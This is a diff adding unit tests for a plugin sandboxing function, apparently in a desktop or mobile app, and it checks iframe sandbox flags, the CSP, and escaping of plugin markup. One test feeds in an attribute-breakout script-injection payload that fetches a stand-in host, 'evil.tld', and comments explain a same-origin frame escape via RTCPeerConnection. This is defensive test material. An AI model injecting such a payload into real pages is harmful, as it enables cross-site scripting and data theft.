@@ -10,6 +10,7 @@ import {
   parsePluginGuestMessage,
   resolvePluginOpenFilePath,
   toPluginRelativePath,
+  wrapPluginHostDocument,
   wrapPluginHtml,
   type PluginGuestHandlers,
   type PluginThemeTokens,
@@ -223,6 +224,43 @@ describe("wrapPluginHtml", () => {
       // committed to the policy before it sees a byte of plugin markup.
       expect(wrapped.slice(SHELL_PREFIX.length)).toBe(`${html}</body></html>`);
     }
+  });
+
+  // Native used to load the plugin as the WebView's top document, which is what
+  // made it the odd platform out: with no `sandbox` attribute anywhere, a frame
+  // the plugin creates inherits the parent's origin instead of getting a fresh
+  // opaque one, so `frames[0].RTCPeerConnection` is readable synchronously and
+  // no observer gets a turn in between.
+  describe("wrapPluginHostDocument", () => {
+    it("renders the plugin in a sandboxed frame with no same-origin escape", () => {
+      const host = wrapPluginHostDocument("<p>hi</p>");
+      expect(host).toContain('<iframe id="paseo-plugin" sandbox="allow-scripts"');
+      expect(host).not.toContain("allow-same-origin");
+      expect(host).not.toContain("allow-popups");
+      expect(host).not.toContain("allow-forms");
+      expect(host).not.toContain("allow-top-navigation");
+    });
+
+    it("denies the frame navigating itself out, which the guest policy cannot", () => {
+      expect(wrapPluginHostDocument("")).toContain("frame-src 'none'");
+    });
+
+    it("escapes the plugin so it cannot break out of the srcdoc attribute", () => {
+      const host = wrapPluginHostDocument('"><script>fetch("https://evil.tld")</script>');
+      // Nothing the plugin wrote may appear as markup in the host document: one
+      // unescaped quote closes `srcdoc` and the rest runs in the host realm,
+      // which is the realm with the bridge in it.
+      expect(host).not.toContain('"><script>fetch');
+      expect(host).toContain("&quot;&gt;&lt;script&gt;");
+    });
+
+    it("still puts the CSP and the neutering script in front of the plugin", () => {
+      const host = wrapPluginHostDocument("<p>hi</p>");
+      expect(host).toContain(
+        `&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;${PLUGIN_CONTENT_SECURITY_POLICY.replace(/'/g, "'")}&quot;&gt;`,
+      );
+      expect(host).toContain("RTCPeerConnection");
+    });
   });
 
   it("denies network, storage, forms, and base rewriting in the policy it injects", () => {
